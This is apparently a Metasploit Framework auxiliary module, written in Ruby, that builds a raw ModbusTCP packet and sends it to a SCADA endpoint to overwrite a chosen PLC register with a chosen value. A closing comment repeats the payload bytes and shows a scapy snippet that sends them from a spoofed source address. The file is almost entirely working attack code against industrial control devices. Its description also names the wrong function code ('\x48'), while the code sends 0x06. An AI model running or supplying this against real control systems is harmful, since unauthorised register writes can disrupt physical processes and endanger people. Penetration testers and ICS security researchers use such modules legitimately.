##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Fuzzer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Modbus Client Utility',
      'Description'    => %q{
        This module sends a command (0x06, write to one register) to a Modbus endpoint.
        You can change port, IP, register to write and data to write, as well as unit-id.

        Modbus is a clear text protocol used in common SCADA systems, developed
        originally as a serial-line (RS232) async protocol. It is later transformed
        to IP, which is called ModbusTCP.

        There are a handful of functions which are possible to do, but this
        client has only implemented the function "write value to register" (\x48).
      },
      'Author'         => [ 'EsMnemon <esm[at]mnemonic.no>' ],
      'References'     =>
        [
          ['URL', 'http://www.saia-pcd.com/en/products/plc/pcd-overview/Pages/pcd1-m2.aspx']
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Nov 1 2011'
    ))

    register_options([
      Opt::RPORT(502),
      OptInt.new('UNIT_ID', [true, "ModBus Unit Identifier ", 1]),
      OptInt.new('MODVALUE', [true, "ModBus value to write (data) ", 2]),
      OptInt.new('REGIS', [true, "ModBus Register definition", 1002])
    ], self.class)
  end

  def run
    trans_id ="\x21\x00"
    proto_id ="\x00\x00"
    len      ="\x00\x06"
    func_id  ="\x06"

    #For debug:    MODVALUE=19276  REGIS=18762, UNIT_ID=71
    #trans_id="\x41\x42"
    #proto_id="\x43\x44"
    #len="\x45\x46"
    #func_id="\x48"

    sploit  = trans_id
    sploit += proto_id
    sploit += len
    sploit += [datastore['UNIT_ID']].pack("C")
    sploit += func_id
    sploit += [datastore['REGIS']].pack("S").reverse
    sploit += [datastore['MODVALUE']].pack("S").reverse

    connect()
    sock.put(sploit)
    sock.get_once
    disconnect()
  end
end


=begin
MODBUS:  10 00 00 00 00 06 01 06 03 ea 00 02
tested on a SAIA PCD1.M2
scapy - even with source-IP
       sploit="\x21\x00\x00\x00\x00\x06\x01\x06\x03\xea\x00\x02"
       ip=IP(dst="172.16.10.10",src="172.16.10.155",proto=6,flags=2)
       tcp=TCP(dport=509)
       send(ip/tcp/sploit)

=end
